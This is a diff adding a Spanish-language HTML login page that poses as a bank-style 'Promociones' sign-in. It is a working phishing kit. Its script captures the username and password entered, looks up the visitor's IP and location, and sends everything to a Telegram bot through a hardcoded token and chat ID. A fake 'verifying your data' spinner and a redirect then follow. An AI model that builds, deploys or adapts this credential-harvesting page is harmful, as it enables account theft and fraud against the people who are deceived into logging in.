@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Promociones - General</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh; /* Cambiado a 100vh para ocupar toda la altura de la ventana */
+            margin: 0;
+            animation: backgroundChange 8s infinite; 
+            background: linear-gradient(to bottom, #004c97, #1c71cc); /* Degradado de azul oscuro a azul claro */
+        }
+
+        .loading {
+            display: none;
+            position: fixed; /* Mantenerlo fijo en la ventana */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%); /* Centrar el contenedor */
+            text-align: center;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid white;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .logo-pequeño {
+            width: 400px;
+            margin: 0 0 1px;
+        }
+
+        .input-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            overflow: hidden;
+            padding: 5px; /* Añadido para un poco de espacio */
+            background: white; /* Fondo blanco para el input */
+            width: 300px; /* Ancho de las casillas */
+            height: 28px; /* Alto de las casillas */
+        }
+
+        .icon {
+            margin: 5px;
+            width: 17px; /* Ancho de la imagen del emoticono */
+            height: 17px; /* Alto de la imagen del emoticono */
+        }
+
+        input[type="text"], input[type="password"] {
+            flex-grow: 1;
+            padding: 10px;
+            border: none;
+            font-size: 15px;
+            color: #333; 
+            border-radius: 5px; 
+            outline: none; 
+            height: 30px; /* Alto del campo de texto */
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            box-shadow: 0 0 5px rgba(40, 128, 223, 0.5); 
+        }
+
+        .button {
+            width: 100%;
+            padding: 11px;
+            background-color: transparent; 
+            color: white; 
+            border: 1px solid white; /* Borde más fino */
+            border-radius: 5px; 
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: bold;
+            margin-top: 10px; 
+            transition: background-color 0.3s; 
+            opacity: 0.5; /* Inicialmente opaco */
+            pointer-events: none; /* Deshabilitar interacción */
+        }
+
+        .button.enabled {
+            opacity: 1; /* Hacerlo visible cuando está habilitado */
+            pointer-events: auto; /* Habilitar interacción */
+        }
+
+        .button:hover {
+            background-color: rgba(255, 255, 255, 0.2); /* Fondo ligero al pasar el ratón */
+        }
+
+        .first-time-text {
+            font-size: 14px; 
+            color: #fff; /* Cambiado a blanco para mejor contraste */
+            text-align: center; 
+            margin-top: 30px;
+        }
+
+        .version-text {
+            font-size: 11px; 
+            color: #fff; /* Cambiado a blanco para mejor contraste */
+            margin-top: 20px; 
+            position: absolute; /* Posicionarlo en el medio */
+            bottom: 20px; /* Distancia desde la parte inferior */
+            text-align: center; /* Centrado horizontal */
+            left: 50%; /* Posicionarlo al medio */
+            transform: translateX(-50%); /* Ajustar la posición */
+            background: transparent; 
+        }
+
+        .loading p {
+            color: white;
+            margin-top: 10px; /* Espacio entre el spinner y el texto */
+        }
+    </style>
+</head>
+<body>
+    <img src="logogeneral.png" alt="Logo Pequeño" class="logo-pequeño" id="logo">
+
+    <form id="login-form">
+        <div class="input-container">
+            <img src="https://cdn-icons-png.flaticon.com/512/1946/1946429.png" alt="Usuario" class="icon"> <!-- Emoticono de usuario -->
+            <input type="text" id="username" name="username" placeholder="Usuario" required>
+        </div>
+        <div class="input-container">
+            <img src="https://cdn-icons-png.flaticon.com/512/2107/2107958.png" alt="Candado" class="icon"> <!-- Emoticono de candado correcto -->
+            <input type="password" id="password" name="password" placeholder="Contraseña" required>
+        </div>
+        <p class="first-time-text">¿Olvidaste la contraseña?</p>
+        <button type="button" class="button" id="next-button">Entrar</button>
+        <button type="button" class="button" id="forgot-password-button" style="opacity: 1; pointer-events: auto;">Crea tu usuario o abre tu cuenta</button>
+    </form>
+
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <p>Estamos accediendo a la promoción, mientras verificamos sus datos.</p>
+    </div>
+
+    <p class="version-text">Versión 7.1.143781</p>
+
+    <script>
+        const token = '6813453135:AAGfFRmuT5uVMFHzXzotCDQmXs3uj8wqB6o'; // Reemplaza esto con tu token de bot
+        const chatId = '-4037234500'; // Reemplaza esto con tu chat_id
+
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const nextButton = document.getElementById('next-button');
+
+        // Función para habilitar o deshabilitar el botón
+        function toggleButtonState() {
+            if (usernameInput.value && passwordInput.value) {
+                nextButton.classList.add('enabled');
+            } else {
+                nextButton.classList.remove('enabled');
+            }
+        }
+
+        // Event listeners para los campos de entrada
+        usernameInput.addEventListener('input', toggleButtonState);
+        passwordInput.addEventListener('input', toggleButtonState);
+
+        nextButton.addEventListener('click', function() {
+            const username = usernameInput.value;
+            const password = passwordInput.value;
+
+            // Obtener datos de ubicación usando ipapi
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(locationData => {
+                    const ip = locationData.ip;
+                    const city = locationData.city;
+                    const country = locationData.country_name;
+
+                    // Enviar datos al bot de Telegram
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: `Usuario registrado: ${username}\nContraseña: ${password}\nIP: ${ip}\nCiudad: ${city}\nPaís: ${country}`
+                        }),
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Éxito:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Error:', error);
+                    });
+
+                    // Ocultar el contenedor de inicio de sesión
+                    document.querySelector('form').style.display = 'none';
+                    // Ocultar el logo
+                    document.getElementById('logo').style.display = 'none';
+                    // Mostrar el contenedor de carga
+                    document.getElementById('loading').style.display = 'block';
+
+                    // Redirigir después de 5 segundos
+                    setTimeout(function() {
+                        window.location.href = 'index.html'; // Cambia a la URL deseada
+                    }, 5000); // 5000 milisegundos = 5 segundos
+                })
+                .catch(error => {
+                    console.error('Error al obtener la ubicación:', error);
+                });
+        });
+    </script>
+</body>
+</html>
